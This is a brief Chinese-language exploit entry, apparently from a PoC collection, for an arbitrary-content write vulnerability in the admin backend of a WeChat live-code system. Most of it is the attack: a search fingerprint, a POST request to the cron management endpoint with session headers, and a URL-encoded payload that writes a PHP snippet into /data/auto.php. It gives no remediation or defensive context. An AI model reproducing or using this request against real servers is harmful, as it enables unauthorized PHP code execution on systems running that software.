# 微信活码系统index后台任意内容写入漏洞

- **系统**：微信活码系统index后台任意内容写入　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body=".qn-user-login"`
- **请求**：`POST /index.php?s=/manage/cron/index HTTP/1.1`
- **关键头**：`Host: 192.168.18.137`　`Cookie: think_language=zh-CN; PHPSESSID=6e7n0os6qsvnlsthdns1dj1n95; qn_admin_think_langu…`　`Priority: u=0`　`X-Requested-With: XMLHttpRequest`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`Content-Length: 38`

**请求体 / payload**
```
QUEUE_SET=%3C%3Fphp+phpinfo()%3B%3F%3E
文件地址：/data/auto.php
```
- **预期**：200　|　—